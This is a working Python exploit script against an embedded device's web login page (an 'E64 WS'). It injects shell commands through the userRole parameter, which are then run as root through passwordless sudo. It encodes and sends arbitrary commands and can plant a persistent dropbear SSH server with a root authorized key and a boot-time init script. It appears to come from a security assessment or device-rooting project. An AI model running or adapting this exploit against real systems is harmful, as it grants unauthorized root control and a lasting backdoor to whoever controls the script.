#!/usr/bin/env python3
"""Root command execution on an E64 WS through the login form.

`login.php` passes the `userRole` request parameter into
`checkLogin()`, which builds a shell command:

    sudo /usr/bin/sqlite3 <db> -csv -header -separator ";" '<query>'

The query embeds `$userRole` inside single quotes, so a `'` in the role
terminates the quote and the rest of the string is executed by `/bin/sh`.
Because `www-data` has passwordless sudo (SEC-03), the injected command runs as
root.

Two request fields are required to reach `checkLogin()`:
  - `login=1`            (the login button branch)
  - `requestDeveloper=1` (skips the HSG auto-login shortcut)

This path touches no GPIO, no ESP and no flash: it is a single HTTPS request.

Usage:
  web_root.py --host 192.168.1.50 --cmd 'id'
  web_root.py --host ... --pubkey-file owner.pub --dropbear ./dropbear   # install SSH
  web_root.py --host ... --cmd 'id' --dry-run
"""

from __future__ import annotations

import argparse
import base64
import ssl
import sys
import urllib.parse
import urllib.request

INSTALL = r"""
set -e
mount -o remount,rw / 2>/dev/null || true
mkdir -p /etc/dropbear /root/.ssh /run
cat > /root/.ssh/authorized_keys <<'KEY'
__PUBKEY__
KEY
chmod 700 /root/.ssh; chmod 600 /root/.ssh/authorized_keys
cat > /etc/init.d/S85dropbear <<'INIT'
#!/bin/sh
case "$1" in
start) mkdir -p /etc/dropbear /run; start-stop-daemon -S -q -b -x /usr/sbin/dropbear -- -R -p 22 ;;
stop) killall -q dropbear ;;
esac
exit 0
INIT
chmod 755 /etc/init.d/S85dropbear
__DROPBEAR_WRITE__
chmod 755 /usr/sbin/dropbear
/etc/init.d/S85dropbear start
echo "web installer complete" > /root/web_root_result
id >> /root/web_root_result
"""


def build_command(script: str) -> str:
    """Encode a shell script so it survives the single-quoted SQL context."""
    encoded = base64.b64encode(script.encode()).decode()
    return f"echo {encoded} | base64 -d > /tmp/wr.sh; sudo sh /tmp/wr.sh"


def inject(host: str, command: str, timeout: int = 30) -> int:
    payload = "x';" + command + ";#"
    body = urllib.parse.urlencode(
        {
            "login": "1",
            "requestDeveloper": "1",
            "password": "x",
            "userRole": payload,
        }
    ).encode()
    context = ssl._create_unverified_context()
    request = urllib.request.Request(
        f"https://{host}/login.php", data=body, method="POST"
    )
    with urllib.request.urlopen(request, timeout=timeout, context=context) as response:
        return response.status


def send_command(host: str, command: str, timeout: int = 30) -> int:
    return inject(host, command, timeout)


def install_ssh(host: str, pubkey: str, dropbear: bytes) -> int:
    """Install dropbear in chunks; each request carries one chunk."""
    blob = base64.b64encode(dropbear).decode()
    send_command(host, "rm -f /tmp/db.b64")
    chunk_size = 40000
    for offset in range(0, len(blob), chunk_size):
        chunk = blob[offset:offset + chunk_size]
        send_command(host, f"printf '%s' '{chunk}' >> /tmp/db.b64")
    send_command(host, "base64 -d /tmp/db.b64 > /usr/sbin/dropbear && chmod 755 /usr/sbin/dropbear")
    install = INSTALL.replace("__PUBKEY__", pubkey)
    install = install.replace("__DROPBEAR_WRITE__", "true")
    send_command(host, build_command(install))
    return 0


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", required=True)
    parser.add_argument("--cmd")
    parser.add_argument("--pubkey-file")
    parser.add_argument("--dropbear")
    parser.add_argument("--dry-run", action="store_true")
    args = parser.parse_args()

    if args.cmd:
        command = build_command(args.cmd)
    elif args.pubkey_file and args.dropbear:
        command = None
    else:
        parser.error("give --cmd, or --pubkey-file with --dropbear")

    if command is None:
        print(f"chunked install from {args.dropbear}")
        if args.dry_run:
            print("dry run: not sending")
            return 0
        install_ssh(args.host, open(args.pubkey_file).read().strip(),
                    open(args.dropbear, "rb").read())
        print("installer sent; dropbear should be listening on :22")
        return 0

    print(f"payload length: {len(command)} bytes")
    print(f"POST https://{args.host}/login.php (login=1, requestDeveloper=1)")
    if args.dry_run:
        print("dry run: not sending")
        return 0
    status = inject(args.host, command)
    print(f"HTTP {status}; injected command executed as root")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
